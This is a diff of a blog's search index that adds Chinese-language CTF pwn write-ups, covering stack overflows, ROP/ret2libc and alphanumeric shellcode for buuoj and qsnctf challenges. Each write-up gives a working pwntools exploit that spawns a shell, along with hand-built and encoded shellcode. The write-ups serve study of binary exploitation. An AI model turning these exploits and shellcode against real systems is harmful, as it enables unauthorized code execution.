@@ -1404,6 +1404,380 @@ DEL (Delete)
       </tags>
   </entry>
   <entry>
+    <title>easy-shellcode</title>
+    <url>//docx/easy-shellcode/</url>
+    <content><![CDATA[
+类型：shellcode、栈溢出
+https://www.qsnctf.com/  题目叫做：Easy_Shellcode
+
+
+
+输入然后栈中执行，一开始的时候会输出v4的地址。
+
+PIE每次会随机地址，但是按照人类逻辑的最前面三位不动。通过0x7ff将后面的值全部获取。再return到这里执行shellcode即可。
+exp:
+from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)ip=&#x27;challenge.qsnctf.com&#x27;port=34976file_addr = &#x27;./easy-shellcode&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)v4_addr=int(p.recvline()[2:],16)print(v4_addr)shellcode = asm(shellcraft.sh())payload = shellcodepayload += b&#x27;\x90&#x27;*(0x100-len(shellcode)+8)+p64(v4_addr)# print(payload)p.send(payload)p.interactive()
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN-writeup</tag>
+        <tag>qsnctf</tag>
+        <tag>栈溢出</tag>
+        <tag>rop</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ciscn_2019_s_9</title>
+    <url>//docx/ciscn_2019_s_9/</url>
+    <content><![CDATA[
+Shellcode 栈溢出
+https://buuoj.cn/challenges#ciscn_2019_s_9
+
+首先checksec一下，看一下大概内容：
+
+IDA打开之后，发现有一个后门函数hint，逻辑如下：
+
+使用此函数的时候，执行esp里面的内容（使用了jmp），我们不需要这些上面什么乱七八糟的东西，我们只需要.text里面的0x08048554的jmp esp就行了。先记下来这是我们可以利用的漏洞。
+
+然后这里是程序唯一一个输入口，也就是说大概率这里有漏洞： 他首先可以让我输入32h的内容，不过通过伪C代码（其实汇编也能看到），这个字符串的长度只有24。也就是说可以构造栈溢出，这个就很简单了。那么我现在构造含有shellcode这样的一个payload：
+
+所以说，大概代码如下：
+from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29162)# p = process(&quot;./ciscn_s_9&quot;)#shellcode = asm(shellcraft.sh())shellcode_handmade = asm(&quot;&quot;&quot;    xor eax,eax    push 0x0068732f    push 0x6e69622f    mov ebx, esp     mov al, 0xb    int 0x80                         &quot;&quot;&quot;)jmp_esp_addr = 0x8048554shell = asm(&#x27;&#x27;&#x27;sub esp,0x28call esp&#x27;&#x27;&#x27;)payload = shellcode_handmade.ljust(32+4,b&#x27;a&#x27;) + p32(jmp_esp_addr) + shellprint(payload)p.sendafter(b&#x27;tell?\n&#x27;,payload)p.interactive()
+
+如果直接用shellcraft.sh()的话，生成出来的shellcode就太大了，会超过程序给我们的栈可用长度（38字节）
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[NewStarCTF 2023 公开赛道]shell code revenge</title>
+    <url>//docx/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/</url>
+    <content><![CDATA[
+特殊shellcode
+https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shellcode%20revenge
+
+这道题有点像我之前做过的mrctf的shellcode的revenge。不过范围不一样。
+
+大概看一下，把所有的大写字母和数字都排除在外了，意思是只要输入大写字母和数字就不会被break——跳出。
+所以我们要创造一个只有大写字母和数字的shellcode？
+然后我也懒得checksec了，而且用的是rsp——也就是64位。开了一些保护啥的，反正jumpout到的66660000h这个地址在上面的mmap里面写入了权限’7’（第三参数），也就是可读可写可执行。
+整个代码的逻辑是：出现Show me your magic之后，进入一个for循环，for循环一开始会有一个read让我们输入数据，因为是一个char类型指针buf，每次读取一个值。然后下面的strncpy()会把我们一个一个输入的buf存到src里面的src复制到我们的0x66660000地址里面，我们可以看main函数的堆栈视图：
+
+我们要将数据存放到src的位置，而且只能输入264个字符（这264字符是可用的shellcode长度）。
+不过这道题目比较难，是一个可见字符shellcode。要构造一个可见字符shellcode还必须是大写和数字就很麻烦了，目前自动生成的大部分都是大小写+数字的组合。
+这边用了一个read函数，其中第一参数是0，也就是fd里面的标准输入，我输入进去的东西都会从这个里面获取到，第二参数是buf变量地址（一个指针）也就是读取的大小，第三参数是读取权限。
+
+汇编这里会写的更清楚一点，edi的值变成了0。我们可以通过这个值进行运算，例如[edi+0x10]得到的值就是0+0x10&#x3D;0x10。
+现在的思路是，我可以用可见字符来构造一个最小的shellcode，目的是为了调用read函数，让read函数再一次读取值存放到66660000h这个地址上，覆盖我之前的为了调用read函数而构造的shellcode，再一次读取的shellcode不会有什么奇怪的判定条件，它可以直接执行我输入进去的任何东西。
+构造第一段shellcode - read函数构造可见ASCII shellcode是一个很麻烦的工作，我们先看一下普通的shellcode，拿64位举例：
+;;nasm -f elf64 shellcode64.asm;;ld -m elf_x86_64 -o shellcode64 shellcode64.o;;objdump -d shellcode64global _start_start:    mov rbx, &#x27;/bin/sh&#x27;     ; 把字符串&quot;/bin/sh&quot;的地址放到rbx寄存器    push rbx               ; 将&quot;/bin/sh&quot;的地址压入栈    push rsp               ; 把当前栈顶指针（指向&quot;/bin/sh&quot;地址）压入栈    pop rdi                ; 从栈弹出数据到rdi，使rdi指向&quot;/bin/sh&quot;    xor rsi, rsi           ; 清空rsi（argv参数设为0）    xor rdx, rdx           ; 清空rdx（envp参数设为0）    push 0x3b              ; 把系统调用号0x3b压入栈    pop rax                ; 从栈弹出数据到rax，设置系统调用号    syscall                ; 执行系统调用
+
+最麻烦的部分就是/bin/sh和syscall，一个是字符串，另外一个是命令。其中syscall的机器码是0x0f05，汇编的书籍或Intel&#x2F;AMD开发者用书里面也会说到。
+可是syscall不是可见字符啊，更不是A-Z，0-9之间的数值。这要怎么办？
+异或加密异或是一种逻辑运算，A⊕B得到的值是C，而C⊕B之后得到的值就是A。逻辑如下：、
+
+如此，我就可以构造一个这样的设计：
+
+
+我们假设字符’A’为密钥，将syscall作为原始数据输入计算得到加密数据：0x0f05⊕0x4141&#x3D;0x4e44（都为可见字符），所以我们确实可以用它来作为密钥。
+加密后的syscall需要写入内存，但是直接写入的指令mov机器码很显然不是可见字符，而xor为可见字符0x33&#x3D;’3’。或者0x31&#x3D;’1’。
+为什么有两个？是因为xor的运算符定义是这样的：
+xor [a值], [b值]
+
+而在汇编里面，寄存器需要放在前面，其他的放在后面，也就变成了:&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor 寄存器, 其他值&lt;/font&gt;，所代表的意思也就是将寄存器里面的值和其他值进行异或处理后，存储到寄存器里面。
+如果我们要实现：&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor 其他值, 寄存器&lt;/font&gt;，也就是将其他值和寄存器做异或处理后，将计算后的值存储到其他值里面，这个时候在机器码里面，依旧要按照：&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor机器码 寄存器机器码，其他值&lt;/font&gt;的顺序。
+于是就有了两个xor，一个代表的是第一种情况，一个代表第二种情况，分别为&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x33&lt;/font&gt;和&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x31&lt;/font&gt;
+异或解密syscall这个时候我们就可以开始构造一些东西了，首先看代码，
+我们会发现在jmp到66660000h这个地址前，我们的eax被归0了，所以就可以利用这一点，配合xor来创造
+并且制造出syscall的加密数据形式0x4e444e44（输入两遍是为了防止一遍不运行）
+首先一开始是&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;xor eax,NUM&lt;/font&gt;，实际上是&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;[rdx+0x38]&lt;/font&gt;，为什么是&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;rdx+NUM&lt;/font&gt;？在这里我们看到esi和edx都被复制为了66660000h，实际上这个就是打定了 内存区域中的基地址 ，那为什么偏偏是这个地址呢？这其实有点玄学，因为似乎rdx会作为这个偏移值的基地址，而刚好这边初始化了edx。而大概率选择了rdx作为基地址来偏移。
+我们构造这么一个逻辑：
+
+这里面有很多零碎的知识点，我们先讲一个大概，后面慢慢补充：
+首先是上面的机器码部分，因为程序必须输入可见字符，其中第一部分的可见字符是0x300x39，可见字符’0’‘9’的部分。我在这里输入的是0x33 0x42 addr1，这个代码的汇编样式是：xor rax, [addr1]，目的是将rax里面的值改成’A’，0x42是寄存器rax的机器码。rax的值一开始为0，A⊕0&#x3D;A，而		
+rax==0, [addr]==&#x27;A&#x27;rax=rax⊕[addr1]   =0⊕&#x27;A&#x27;   =&#x27;A&#x27;
+
+通过这一步，我就可以把rax的值改成’A’了。
+然后第二步，使用xor指令配合修改成’A’值的寄存器rax对下面的加密后syscall做处理。第一个加密syscall的起始地址为addr2，利用&lt;font style=&quot;color:rgb(17, 17, 17);&quot;&gt;0x31 0x42 addr2&lt;/font&gt;这个命令，就可以修改addr2中的数据。逻辑为：[addr2] ⊕ rax &#x3D;
+[addr2]==0x4e, rax==&#x27;A&#x27;[addr2]=[addr2]⊕rax       =0x4e⊕0x41       =0x0f
+
+第三步，我们要还原rax寄存器的值为0，为什么？因为我们的核心逻辑是再调用一次read函数，然后读取我们写入的第二段shellcode（可以直接进入&#x2F;bin&#x2F;sh的）到特定的内存里，然后让PC，也就是程序计数器读到第二段shellcode的内容执行即可。用rax里面的值随便找一个’A’做异或即可。
+rax==&#x27;A&#x27; [addr1]==&#x27;A&#x27;rax=rax⊕[addr1]   =&#x27;A&#x27;⊕&#x27;A&#x27;   =&#x27;A&#x27;
+
+如此完成后，即可。
+现在的问题是addr2和addr1应该是多少？
+因为我们输入的addr2和addr1必须是可见字符，也就是0x30-0x39之间的数值，而二遍syscall最多占用四个地址。所以我们把第一个syscall的起始地址addr2放在0x30的位置就行了。中间用pop rcx这种方式来过度，他的机器码刚好也是一个可见字符，而rcx在程序中这个寄存器也没有用到，他里面的值是多少不重要（类似于NOP滑块指令，目的只是塞入值，并且让程序读到这些中间值又可以运行）
+而addr的地址则为0x30后4个数字（因为包括0x30，所以第4个数字实际上是0x33），在第五位的时候塞入数据’A’做填充。一般而言只要两个’A’就行了。我们这边填充8个A。所以第一段的代码就被写出来了：
+payload =  b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]payload += b&#x27;\x31\x42\x30&#x27;  #31 42 30 xor DWORD PTR [rdx+0x30], eaxpayload += b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]# payload += b&#x27;\x31\x42\x38&#x27;  #31 42 38 xor DWORD PTR [rdx+0x38], eax 这个可以保证最后rdx0x38里面的值变成A？payload += b&#x27;\x59&#x27;*(0x30-len(payload))  #59 pop rcxpayload += b&#x27;\x4e\x44&#x27;*2    #syscall  0x4e^0x41=0xf 0x44^0x41=0x5payload += b&#x27;A&#x27; * 8        #xor keyp.sendlineafter(&quot;magic\n&quot;,payload)
+
+一些没有讲的小问题
+1、为什么我只异或了0x30地址上的4e，syscall却正常运作了呢？
+不知为何，寄存器不知道调用的是eax还是rax，其实不重要，他会与后面所有的字符A做异或，然后再与两个字节的syscall，也就是两个0x4e44做处理。如果我在这里后面的字符’A’只有两个的话就会与第一个0x4e44做处理，这个是gdb后的结果，原理是什么我也不清楚…所以字符’A’的长度必须大于2，不然0x44的部分就不会被处理了。
+2、如果我把payload中的\x38改成\x3a（也是存有’A’的地址），为什么运行不了呢？
+因为0x3a是字符’:’，不是可见字符……
+第二段shellcode第二段就很简单了，我只需要放入NOP字符滑过和覆盖之前的内容即可，然后再塞入&#x2F;bin&#x2F;sh的shellcode即可。
+p.sendline(b&#x27;\x90&#x27;*0x50+asm(shellcraft.sh()))
+
+
+
+全部代码：#[NewStarCTF 2023 public race]shellcode revengefrom pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=27424p = remote(ip,port)payload =  b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]payload += b&#x27;\x31\x42\x30&#x27;  #31 42 30 xor DWORD PTR [rdx+0x30], eaxpayload += b&#x27;\x33\x42\x38&#x27;  #33 42 38 xor eax, DWORD PTR [rdx+0x38]payload += b&#x27;\x59&#x27;*(0x30-len(payload))  #59 pop rcxpayload += b&#x27;\x4e\x44&#x27;*2    #syscall  0x4e^0x41=0xf 0x44^0x41=0x5payload += b&#x27;A&#x27; * 8        #xor keyp.sendlineafter(&quot;magic\n&quot;,payload)pause()p.sendline(b&#x27;\x90&#x27;*0x50+asm(shellcraft.sh()))p.interactive()
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jarvisoj_level2</title>
+    <url>//docx/jarvisoj_level2/</url>
+    <content><![CDATA[
+ROP-ret2text，栈溢出
+https://buuoj.cn/challenges#jarvisoj_level2
+
+首先checksec一下：
+
+32位，有栈堆不可执行。
+
+main函数调用了system函数，说明我们可以知道system函数的地址，找一下：
+
+system_addr = 0x08048320
+再看一下main函数中调用的另外一个函数vulnerable_function()
+
+非常明显的栈溢出。
+回忆一下栈帧结构：
+
+在这里，我们首先溢出覆盖vulnerable_function()函数的返回地址，将返回地址修改成system函数，然后再往system函数里面塞入参数“&#x2F;bin&#x2F;sh”即可。
+
+在system函数的栈帧结构是这样的：command参数在返回地址的上面，所以我们的payload的构造思路是这样的：
+
+然后还需要一个参数“&#x2F;bin&#x2F;sh”，非常好的是我们不需要自己构造了，在Strings视图里面找到了一个存有此参数的地址，我们直接把这个地址塞进去即可。0x0804A024
+
+exp:
+from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=28815file_addr = &#x27;./jarvisoj_level2&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)system_addr=0x08048320binsh_str_addr=0x0804A024payload = b&#x27;a&#x27;*(136+4)+p32(system_addr)+b&#x27;a&#x27;*4+p32(binsh_str_addr)print(payload)p.send(payload)p.interactive()
+
+
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN-writeup</tag>
+        <tag>栈溢出</tag>
+        <tag>rop</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jarvisoj_level1</title>
+    <url>//docx/jarvisoj_level1/</url>
+    <content><![CDATA[checksec
+
+
+
+保护全关，32位系统。其中一开始会输出buf的地址
+这个逻辑很简单，我先输入shellcode，然后栈溢出，返回到栈上的buf地址运行即可。
+exp：
+from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;ip_addr&#x27;port=1111file_addr = &#x27;./jarvisoj_level1&#x27;# p = remote(ip,port)p = process(file_addr)elf = ELF(file_addr)buf_addr = int(p.recvline()[len(&quot;What&#x27;s this:&quot;)+2:-2],16)print(buf_addr)payload = asm(shellcraft.sh())payload += b&#x27;a&#x27;*(136-len(payload)+4)payload += p32(buf_addr)p.send(payload)p.interactive()
+
+这个线上似乎没有setbuf，所以输入和输出有点小问题。
+
+似乎需要我先输入什么才会有反应…
+妈的，虽然是题目的bug，但是也不是没有解决方案。我么构造这么一个payload流程：
+
+他似乎收到回车才会输出地址，那么我就先输入一堆东西然后回车，这样他就会输出地址，又会再次返回到vulnerable函数中再输出一次地址，这个时候我再输入shellcode+返回地址为buf。他就可以去buf执行了。
+似乎还是不行…
+还有一个libc的办法来做，思路是这样的：
+构造rop调用write函数来泄露libc的基地址，并且再次调用main函数，根据libc的基址得到system和&#x2F;bin&#x2F;sh字符串地址，然后再次利用漏洞构造rop调用system(‘\bin\sh’)即可。
+
+from pwn import *from LibcSearcher import *context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=28043file_addr = &#x27;./jarvisoj_level1&#x27;p = remote(ip,port)# p = process(file_addr)elf = ELF(file_addr)main_addr=0x80484b7write_plt=elf.plt[&#x27;write&#x27;]write_got=elf.got[&#x27;write&#x27;]payload =b&#x27;a&#x27; * (0x88 + 0x4 ) + p32(write_plt) + p32(main_addr) +p32(0x1)+p32(write_got)+p32(0x4) p.send(payload)write_addr = u32(io.recv(4))libc=LibcSearcher(&#x27;write&#x27;,write_addr)	libc_base=write_addr-libc.dump(&#x27;write&#x27;)system_addr=libc_base+libc.dump(&#x27;system&#x27;)bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload =b&#x27;a&#x27; * (0x88 + 0x4) + p32(system_addr) + p32(main_addr)+ p32(bin_sh)p.send(payload)p.interactive()
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN-writeup</tag>
+        <tag>栈溢出</tag>
+        <tag>rop</tag>
+        <tag>buuctf</tag>
+        <tag>ROP-ret2syscall</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>jarvisoj_level2_64</title>
+    <url>//docx/jarvisoj_level2_64/</url>
+    <content><![CDATA[
+ROP-ret2text，栈溢出
+https://buuoj.cn/challenges#jarvisoj_level2_x64
+
+是jarvisoj_level2的64版本。
+按照32位的思路，我们找一下system函数和“&#x2F;bin&#x2F;sh”即可。
+
+
+system_addr = 0x00000000004004C0
+binsh_str_addr = 0x0000000000600A90
+
+这边的buf栈帧变为128了，需要改一下。其他32位中所有的占4字节的都变成8字节例如saved registers。
+然后，在64位里面，所谓的“形式参数”不再是存储在栈中而是存储在了rdi里面。如图中鼠标指出的所示（因为byd每次截图都截不到只能用手机拍了）
+
+所以我们要把0x0000000000600A90传递给rdi才行。
+
+通过ropper很轻松就能找到这行数据。并且后面还有一个ret我们刚好可以用到。
+其payload构造思路也变成了：
+
+整个流程就是：先调用pop rdi，在rdi里面塞入&#x2F;bin&#x2F;sh的值，随后需要一个ret地址，塞入system地址之后ret指令跳转到system地址。而system会直接调用rdi里面的值，rdi已经变成&#x2F;bin&#x2F;sh了。
+exp:
+from pwn import *file_path = &#x27;./jarvisoj_level2_x64&#x27;context(log_level = &#x27;debug&#x27;, binary=file_path, os = &#x27;linux&#x27;)ip=&#x27;nnode5.buuoj.cn&#x27;port=27500# p = remote(ip,port)p = process(file_path)elf = ELF(file_path)system_addr=0x00000000004004C0system_plt = elf.plt[&#x27;system&#x27;]print(system_plt)binsh_str_addr=0x600A90pop_rdi_ret_addr=0x4006b3payload = b&#x27;a&#x27;*(0x88)+p64(pop_rdi_ret_addr)+p64(binsh_str_addr)+p64(system_plt)print(payload)p.sendafter(&#x27;Input:&#x27;,payload)p.interactive()
+
+后记：我的ubuntu似乎是有点太新了。本地打不通但是远程可以。
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN-writeup</tag>
+        <tag>栈溢出</tag>
+        <tag>rop</tag>
+        <tag>buuctf</tag>
+        <tag>ROP-ret2text</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mrctf2020_shellcode</title>
+    <url>//docx/mrctf2020_shellcode/</url>
+    <content><![CDATA[
+类型：pwn、shellcode 
+https://buuoj.cn/challenges#mrctf2020_shellcode
+
+首先检查文件
+
+大概了解情况之后，根据题目标题，我大概知道是shellcode，然后打开IDA查看一下代码长啥样。
+
+一整个流程是这样的，然后F5也没有办法正常反编译成伪C。
+
+整个使用流程大概如此。
+再回到汇编，在输出之后可以让我读取值。因为call了read函数
+#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);//其中，fd是文件描述符//buf是指向数据将被读取的缓冲区的指针//而count是期望读取的字节数//当调用read函数时，它会尝试从fd指向的文件中读取count个字节的数据到buf所指向的内存中。如果读取成功，函数返回实际读取到的字节数；如果读取到文件末尾或没有可读取的数据，函数返回0；如果发生错误，则返回-1，并将错误代码存入errno中。
+
+
+这边题目给了不少备注，在程序的一开始用了一个buf什么-410h，这个就是rbp的缓冲区。然后在这个下面的时候edx400h的意思是给read函数提供了400h的缓冲区。也就是说我可以输入400的内容并且不会栈溢出。
+通过lea操作符，rax获取了rbp+buf的地址，如果main函数栈从0开始，那么rax现在值就是栈中地址-410h。
+通过read函数不难发现，读取值的void *buf是一个空类型指针，将rax的地址交给他开始读取数据。此时此刻，栈中的数据会被rsi寄存器（这边的寄存器被当作指针用，获取string数据）
+在这里，程序要获取400h的值，那相当多了。获取这些数据要干嘛？接着往下找：
+
+然后，通过一个jg进行跳转，我们先不管这个jump greater的条件。不难发现当判断正确的时候（也就是蓝色的线），会再一次把rbp+buf这个地址交给rax，此时此刻rax就是指向我们刚刚才输入进去的数据的。然后使用了call指令，也就会导致我们输入进去的数据在栈中会被执行。
+我们再回来看这个比较到底是啥：首先mov了eax的值到rbp+ver_4的位置，然后将0和这个值进行比较，如果大于那么就跳转到蓝色部分，否则红色部分。
+不过在read函数调用之前我们就发现，mov eax,0已经把eax寄存器中的值变成0。
+
+在gdb调试后的时候非常神奇，我们的eax虽然被归0了，但是似乎使用完read函数之后，他就莫名其妙的得到了一个0xA的值（并非莫名其妙，最后会讲）。不管如何，他现在反正是大于0的。于是乎我们接下来输入的东西就会被正常执行了，可喜可贺。
+from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)shellcode = asm(shellcraft.sh())p = remote(&quot;node5.buuoj.cn&quot;,26437)#p = process(&quot;./mrctf2020_shellcode&quot;)payload = shellcodep.send(payload)p.interactive()
+
+直接用自带工具构造一个shellcode做成payload，一把梭直接结束。
+
+ls后flag在根目录下，直接cat，然后结束。
+孩子们，我们是不是忘记那个奇怪的eax怎么获得0x0A的值了？
+是的，现在我们来回顾一下这个傻逼read函数：
+#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);
+
+fd.、.buf.、.count分别对应edi，rsi和edx三个寄存器。那么ssize_t类型的返回值去哪里了？
+我们做一个实验，其实有理论可以直接说，不过实验对于我而言印象会更深刻。
+
+我们写一个带有返回值的函数，然后编译之后gdb调试一下：
+
+当我们把add中的return给运行完的时候，返回值也就是10+20&#x3D;&#x3D;30，30也就是0x1e的值出现在了rax寄存器上，也就是说，我这个函数运行完之后的返回值会返回到rax寄存器上。而_read函数的返回值是读取了多少数据他就返回多少，于是乎在我们运行完之后，rax的值变成了0x0A。
+也就是说，返回值会默认给0x0A。所以我可以逆向一下，大概源程序的代码是这样的：
+#include &lt;stdio.h&gt;int main() &#123;    setbuf(0,0);    setbuf(0,0);    setbuf(0,0);    char str[410];    if(read(0,str,0x400)&gt;0)        call(str);    return 0;&#125;
+
+这个只是伪C代码，大概这样写不能还原题目。就这样吧…
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mrctf2020_shellcode_revenge</title>
+    <url>//docx/mrctf2020_shellcode_revenge/</url>
+    <content><![CDATA[
+类型：shellcode 字符审查
+https://buuoj.cn/challenges#mrctf2020_shellcode
+
+一如既往的checksec
+
+打开ida之后我们发现图形化反汇编mian函数里面有很多的跳转。我们直接F5，会报错，说call rax这一行有问题。我们直接右键未定义即可。
+
+看起来是一堆if字符检测，我们拿出离散数学的知识和ASCII码表对照一看就会快速发现这是一个把所有的非字母、非数字常规文本字符给去掉了。只有“qwertyuiopasdfghjklzxcvbnm QWERTYUIOPASDFGHJKLZXCV BNM 1234567890”这些字符。
+然后原理和mrctf2020_shellcode一样，读入什么执行什么。
+我们可以用alpha3工具来帮我们生成这个shellcode：alpha3.py
+ok了，然后我们就得到64位的shellcode字符串化的串为：
+Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2O2u2E0Z7m0n7m0R0b2x2o0Y102x0B7O2A1P2J0n102j0V0l2A0T170Z2j0Y7N0O1O137M0I1P132v0H0V10142v060H0f11000J0q11180I1711160J0Z110h0k060V0y0g2E0m0K170u0n110m2H11120n2n0U1N0f7N0m0H192m0n2n0U10112t0H12131k2k0h0l02102w0m0I112m2w0C01
+
+操，太长了。然后我发现用python2的方法生成的可以打通
+exp如下：
+from pwn import*context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)ip=&#x27;node5.buuoj.cn&#x27;port=26117file_addr = &#x27;./mrctf2020_shellcode_revenge&#x27;p = remote(ip,port)#p = process(file_addr)elf = ELF(file_addr)shellcode = b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00&#x27;payload = shellcodeprint(payload)p.sendafter(b&#x27;magic&#x27;,payload)p.interactive()
+
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+        <tag>PWN-writeup</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>overflow_ez_32</title>
+    <url>//docx/overflow_ez_32/</url>
+    <content><![CDATA[首先checksec：
+
+保护全关，一般保护全关的题目要么特别简单要么特别难。很显然（因为这是我自己做的题），这个是前者。（当然不是所有带有ez的题目都很ez）（但是这个是真ez）
+直接拖到ida一探究竟。
+
+有一个main函数和一个back_door，还有一个overflow和init函数，backdoor里面是一个超级大后门：
+
+main函数里面是init和overflow，一个是初始化，还有一个是一个最简单的栈溢出：
+
+如图可见，这里有一个不安全的gets函数，然后有一个s变量。
+
+点进去之后我们就能发现，从-0x18到+0x04都是本栈帧的模样，然后要输入0x18个字节覆盖char字符串s和一个var_4，输入4个字节覆盖saved register，最后输入4字节的地址来覆盖return地址。
+所需要的地址就是我们的backdoor函数地址…
+
+backdoor的位置在0x080491F0这个位置上，当然我们也可以填入0x08049211这个地址，这样可以跳过上面那个puts函数的调用。不过这里没必要，我们就以backdoor的地址为需要进入的地址：
+exp：
+from pwn import *#32context(log_level = &#x27;debug&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)file_addr = &#x27;./overflow_ez_32&#x27;p = process(file_addr)elf = ELF(file_addr)backdoor_addr = 0x080491F0payload = b&#x27;a&#x27;*0x18payload += b&#x27;a&#x27;*0x04payload += p32(backdoor_addr)print(payload)p.sendafter(b&#x27;door?\n&#x27;,payload)p.interactive()
+
+非常简单。
+]]></content>
+      <categories>
+        <category>PWN不出来</category>
+      </categories>
+      <tags>
+        <tag>PWN-writeup</tag>
+        <tag>nxctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux退出状态码</title>
     <url>//docx/Linux%E9%80%80%E5%87%BA%E7%8A%B6%E6%80%81%E7%A0%81/</url>
     <content><![CDATA[
@@ -1648,380 +2022,6 @@ SIGRTMIN~SIGRTMAX
       <tags>
         <tag>PWN攻略-所需表格</tag>
         <tag>计算机原理相关表格</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>[NewStarCTF 2023 公开赛道]shell code revenge</title>
-    <url>//docx/%5BNewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%5Dshell%20code%20revenge/</url>
-    <content><![CDATA[
-特殊shellcode
-https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]shellcode%20revenge
-
-这道题有点像我之前做过的mrctf的shellcode的revenge。不过范围不一样。
-
-大概看一下，把所有的大写字母和数字都排除在外了，意思是只要输入大写字母和数字就不会被break——跳出。
-所以我们要创造一个只有大写字母和数字的shellcode？
-然后我也懒得checksec了，而且用的是rsp——也就是64位。开了一些保护啥的，反正jumpout到的66660000h这个地址在上面的mmap里面写入了权限’7’（第三参数），也就是可读可写可执行。
-整个代码的逻辑是：出现Show me your magic之后，进入一个for循环，for循环一开始会有一个read让我们输入数据，因为是一个char类型指针buf，每次读取一个值。然后下面的strncpy()会把我们一个一个输入的buf存到src里面的src复制到我们的0x66660000地址里面，我们可以看main函数的堆栈视图：
-
-我们要将数据存放到src的位置，而且只能输入264个字符（这264字符是可用的shellcode长度）。
-不过这道题目比较难，是一个可见字符shellcode。要构造一个可见字符shellcode还必须是大写和数字就很麻烦了，目前自动生成的大部分都是大小写+数字的组合。
-这边用了一个read函数，其中第一参数是0，也就是fd里面的标准输入，我输入进去的东西都会从这个里面获取到，第二参数是buf变量地址（一个指针）也就是读取的大小，第三参数是读取权限。
-
-汇编这里会写的更清楚一点，edi的值变成了0。我们可以通过这个值进行运算，例如[edi+0x10]得到的值就是0+0x10&#x3D;0x10。
-现在的思路是，我可以用可见字符来构造一个最小的shellcode，目的是为了调用read函数，让read函数再一次读取值存放到66660000h这个地址上，覆盖我之前的为了调用read函数而构造的shellcode，再一次读取的shellcode不会有什么奇怪的判定条件，它可以直接执行我输入进去的任何东西。
-构造第一段shellcode - read函数构造可见ASCII shellcode是一个很麻烦的工作，我们先看一下普通的shellcode，拿64位举例：
